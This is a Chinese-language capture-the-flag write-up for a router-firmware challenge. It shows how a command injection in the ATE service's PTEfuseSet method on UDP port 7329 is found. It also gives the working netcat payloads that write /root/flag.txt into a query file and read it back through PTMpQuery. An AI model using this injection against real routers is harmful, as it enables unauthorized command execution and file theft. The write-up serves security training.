# NepCTF2026 What's the IPC Writeup

## 题目简述

附件是一个真实路由器固件，远程只开放 ATE 服务的 UDP 7329 端口。解包固件并根据网络回显定位服务代码后，可以发现 `PTEfuseSet` 将用户可控的 `efuse_set` 拼入 shell 命令，形成命令注入。

由于没有其他端口，取得交互式 shell 并不是合理目标。ATE 本身还提供 `PTMpQuery`：它会读取 `/tmp/ate_query_result` 并通过同一 UDP 会话返回内容。利用链因此是“命令注入写查询结果文件，再调用合法查询接口读回”。

## 解题过程

### 1. 解包并定位 ATE 服务

先用 `binwalk` 解包 `firmware.bin`，再搜索连接远程 UDP 端口时出现的回显字符串，可以定位 ATE 请求分发和 JSON 方法名。`PTEfuseSet` 最终把 `param.efuse_set` 拼到系统命令中，未做 shell 元字符过滤。

可控参数形态为：

```json
{
  "method": "PTEfuseSet",
  "param": {
    "efuse_set": "..."
  }
}
```

注入点后面补 `#`，可注释掉服务原本追加的参数。

### 2. 选择可回显的文件通道

ATE 的 `PTMpQuery` 会读取查询日志 `/tmp/ate_query_result` 并返回。因此先执行：

```sh
cat /root/flag.txt > /tmp/ate_query_result
```

再调用 `PTMpQuery` 即可读回，不需要时间侧信道，也不需要重写固件中的 `rtwpriv`。

### 3. 发送两次 UDP 请求

设置目标：

```bash
HOST="challenge.example"
```

第一包通过命令注入覆盖查询结果文件：

```bash
payload='{"method":"PTEfuseSet","param":{"efuse_set":"x;cat /root/flag.txt >/tmp/ate_query_result #"}}'
{
  printf "%s\n" "$payload"
  sleep 2
} | nc -u -w 3 "$HOST" 7329
```

第二包复用合法接口读取结果：

```bash
payload='{"method":"PTMpQuery","param":{}}'
{
  printf "%s\n" "$payload"
  sleep 2
} | nc -u -w 3 "$HOST" 7329
```

第二个响应中即可看到 flag。

## 方法总结

这题的关键不是“拿到命令执行后怎样反弹 shell”，而是根据实际网络暴露面寻找可用的输出通道。只有一个 UDP 服务时，应优先复用该协议已有的读文件、日志、状态或错误回显功能。

固件题也不能只停在 `binwalk`。需要把网络回显、字符串交叉引用、请求分发函数和具体 shell 拼接点串起来，并确认命令执行后的数据如何穿过同一 IPC/协议边界返回给攻击者。
